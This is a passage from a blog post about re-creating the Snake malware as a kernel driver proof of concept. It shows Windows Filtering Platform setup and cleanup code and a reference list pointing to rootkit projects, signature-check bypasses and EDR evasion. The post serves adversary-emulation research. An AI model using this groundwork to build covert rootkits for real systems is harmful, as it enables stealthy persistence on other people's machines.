          <span class="hljs-comment">// Callout function used to process terminated data (does&#x27;t need to be defined)</span><br />    };<br /><br />    <span class="hljs-keyword">return</span> FwpsCalloutRegister(filterDeviceObject, &amp;callout, &amp;registerCalloutId);<br />}<br /><br /><span class="hljs-comment">// Function to initialize the filter driver</span><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">WfpInit</span>(<span class="hljs-params">PDRIVER_OBJECT driverObject</span>)</span> {<br />    engineHandle = NULL; <span class="hljs-comment">// Initialize to NULL (just precaution)</span><br />    filterDeviceObject = NULL; <span class="hljs-comment">// Initialize to NULL (just precaution)</span><br /><br />    <span class="hljs-comment">// Create a device object (used in the callout registration)</span><br />    NTSTATUS status = IoCreateDevice(driverObject, <span class="hljs-number">0</span>, NULL, FILE_DEVICE_UNKNOWN, <span class="hljs-number">0</span>, FALSE, &amp;filterDeviceObject);<br />    KdPrint((<span class="hljs-string">&quot;create filter device.\n&quot;</span>));<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Failed to create the filter device object (0x%X).\n&quot;</span>, status));<br />        <span class="hljs-keyword">return</span> status;<br />    }<br /><br />    <span class="hljs-comment">// Open a session to the filter engine</span><br />    KdPrint((<span class="hljs-string">&quot;Open a session to the filter engine\n&quot;</span>));<br />    status = FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &amp;engineHandle);<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Failed to open the filter engine (0x%X).\n&quot;</span>, status));<br />        <span class="hljs-keyword">return</span> status;<br />    }<br />    <span class="hljs-comment">// Note: All functions have been declared in Trigger.h</span><br />    <span class="hljs-comment">// Register a callout with the filter engine</span><br />    KdPrint((<span class="hljs-string">&quot;Register a callout with the filter engine\n&quot;</span>));<br />    status = CalloutRegister();<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Failed to register the filter callout (0x%X).\n&quot;</span>, status));<br />        <span class="hljs-keyword">return</span> status;<br />    }<br /><br />    <span class="hljs-comment">// Add the callout to the system</span><br />    KdPrint((<span class="hljs-string">&quot;Add the callout to the system\n&quot;</span>));<br />    status = CalloutAdd();<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Failed to add the filter callout (0x%X).\n&quot;</span>, status));<br />        <span class="hljs-keyword">return</span> status;<br />    }<br /><br />    <span class="hljs-comment">// Add a sublayer to the system</span><br />    KdPrint((<span class="hljs-string">&quot;Add a sublayer to the system\n&quot;</span>));<br />    status = SublayerAdd();<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Failed to add the sublayer (0x%X).\n&quot;</span>, status));<br />        <span class="hljs-keyword">return</span> status;<br />    }<br /><br />    <span class="hljs-comment">// Add a filtering rule to the added sublayer</span><br />    KdPrint((<span class="hljs-string">&quot;Add a filtering rule to the added sublayer\n&quot;</span>));<br />    status = FilterAdd();<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Failed to add the filter (0x%X).\n&quot;</span>, status));<br />        <span class="hljs-keyword">return</span> status;<br />    }<br /><br />    <span class="hljs-keyword">return</span> TRUE;<br />}<br /><br /><br /><br /><span class="hljs-comment">// Cleanup functions</span><br /><span class="hljs-function">VOID <span class="hljs-title">TermFilterDeviceObject</span>()</span> {<br />    KdPrint((<span class="hljs-string">&quot;Terminating the device object.\n&quot;</span>));<br /><br />    <span class="hljs-keyword">if</span> (filterDeviceObject) {<br /><br />        <span class="hljs-comment">// Remove the filter device object</span><br />        IoDeleteDevice(filterDeviceObject);<br />        filterDeviceObject = NULL;<br />    }<br />}<br /><br /><span class="hljs-function">VOID <span class="hljs-title">TermCalloutData</span>()</span> {<br />    KdPrint((<span class="hljs-string">&quot;Terminating filters, sublayers and callouts.\n&quot;</span>));<br /><br />    <span class="hljs-keyword">if</span> (engineHandle) {<br /><br />        <span class="hljs-comment">// Remove the added filters and sublayers </span><br />        <span class="hljs-keyword">if</span> (filterId) {<br />            FwpmFilterDeleteById(engineHandle, filterId);<br />            FwpmSubLayerDeleteByKey(engineHandle, &amp;SUB_LAYER_GUID);<br />            filterId = <span class="hljs-number">0</span>;<br />        }<br /><br />        <span class="hljs-comment">// Remove the callout from the FWPM_LAYER_INBOUND_TRANSPORT_V4 layer</span><br />        <span class="hljs-keyword">if</span> (addCalloutId) {<br />            FwpmCalloutDeleteById(engineHandle, addCalloutId);<br />            addCalloutId = <span class="hljs-number">0</span>;<br />        }<br /><br />        <span class="hljs-comment">// Unregister the callout</span><br />        <span class="hljs-keyword">if</span> (registerCalloutId) {<br />            FwpsCalloutUnregisterById(registerCalloutId);<br />            registerCalloutId = <span class="hljs-number">0</span>;<br />        }<br />    }<br />}<br /><br /><span class="hljs-function">VOID <span class="hljs-title">TermWfpEngine</span>()</span> {<br />    KdPrint((<span class="hljs-string">&quot;Terminating the filter engine handle.\n&quot;</span>));<br /><br />    <span class="hljs-keyword">if</span> (engineHandle) {<br /><br />        <span class="hljs-comment">// Close the filter engine handle</span><br />        FwpmEngineClose(engineHandle);<br />        engineHandle = NULL;<br />    }<br />}<br /><br /><span class="hljs-function">VOID <span class="hljs-title">WfpCleanup</span>()</span> {<br />    TermCalloutData();<br />    TermWfpEngine();<br />    TermFilterDeviceObject();<br />}</span></pre><h3 name="aebe" id="aebe" class="graf graf--h3 graf-after--pre">Resources</h3><p name="769d" id="769d" class="graf graf--p graf-after--h3">We covered a lot of ground in this article, and to give you a chance to follow along, here is a list of the resources used with a brief description:</p><ul class="postList"><li name="6cff" id="6cff" class="graf graf--li graf-after--p">[0] First iteration: <a href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-001-or-how-i-learned-to-stop-worrying-and-love-adversary-78c1447c60f5" data-href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-001-or-how-i-learned-to-stop-worrying-and-love-adversary-78c1447c60f5" class="markup--anchor markup--li-anchor" rel="nofollow" target="_blank">https://medium.com/@0x0vid/re-creating-the-snake-malware-part-001-or-how-i-learned-to-stop-worrying-and-love-adversary-78c1447c60f5</a></li><li name="1fbb" id="1fbb" class="graf graf--li graf-after--li">[1] MS resource on writing a kernel driver: <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver" data-href="https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver</a></li><li name="8de3" id="8de3" class="graf graf--li graf-after--li">[2] Disabling integrity checks: <a href="https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html" data-href="https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html</a></li><li name="5904" id="5904" class="graf graf--li graf-after--li">[3] Github containing ICMP rootkit used as base: <a href="https://github.com/V3ded/Blog-Lab" data-href="https://github.com/V3ded/Blog-Lab" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/V3ded/Blog-Lab</a></li><li name="3fce" id="3fce" class="graf graf--li graf-after--li">[4] Post detailing the ICMP rootkit used as a base for this project: <a href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" data-href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2</a></li><li name="075a" id="075a" class="graf graf--li graf-after--li">[5] Sample code for deep packet inspection provided by Microsoft: <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data" data-href="https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener noopener" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data</a></li><li name="bdea" id="bdea" class="graf graf--li graf-after--li">[6] <a href="https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication" data-href="https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication</a></li><li name="a0f1" id="a0f1" class="graf graf--li graf-after--li">[7] IOCTL MS documentation: <a href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-" data-href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-</a></li><li name="5f3a" id="5f3a" class="graf graf--li graf-after--li">[8] Rust rootkit used for reference: <a href="https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs" data-href="https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs</a></li><li name="fae9" id="fae9" class="graf graf--li graf-after--li">[9] Example of kernel-to-user mode communication: <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl" data-href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener" target="_blank">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl</a></li></ul><p name="9750" id="9750" class="graf graf--p graf-after--li">Other:</p><ul class="postList"><li name="adea" id="adea" class="graf graf--li graf-after--p">Rootkit written in rust, with many more examples of both stealth and kernel/userland communication: <a href="https://github.com/memN0ps/rootkit-rs/blob/master/client/src/kernel_interface.rs" data-href="https://github.com/memN0ps/rootkit-rs/blob/master/client/src/kernel_interface.rs" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/memN0ps/rootkit-rs/blob/master/client/src/kernel_interface.rs</a></li><li name="7506" id="7506" class="graf graf--li graf-after--li">Description of WFP and how communication flows using examples: <a href="https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/FWP/tcp-packet-flows.md" data-href="https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/FWP/tcp-packet-flows.md" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener noopener" target="_blank">https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/FWP/tcp-packet-flows.md</a></li><li name="78e8" id="78e8" class="graf graf--li graf-after--li">Investigation on how WFP is used in EDR software also gives good insight into how it can be used: <a href="https://blog.quarkslab.com/guided-tour-inside-windefenders-network-inspection-driver.html" data-href="https://blog.quarkslab.com/guided-tour-inside-windefenders-network-inspection-driver.html" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener noopener" target="_blank">https://blog.quarkslab.com/guided-tour-inside-windefenders-network-inspection-driver.html</a></li><li name="0012" id="0012" class="graf graf--li graf-after--li graf--trailing">Investigation on how WFP is used in EDR software also provides a very high level run thorough of basic implementation: <a href="https://nostarch.com/evading-edr" data-href="https://nostarch.com/evading-edr" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener noopener" target="_blank">https://nostarch.com/evading-edr</a></li></ul></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@0x0vid" class="p-author h-card">0x0vid</a> on <a href="https://medium.com/p/36f5d231f998"><time class="dt-published" datetime="2024-01-08T12:52:44.069Z">January 8, 2024</time></a>.</p><p><a href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-002-starting-on-the-kernel-driver-poc-36f5d231f998" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on March 28, 2024.</p></footer></article></body></html>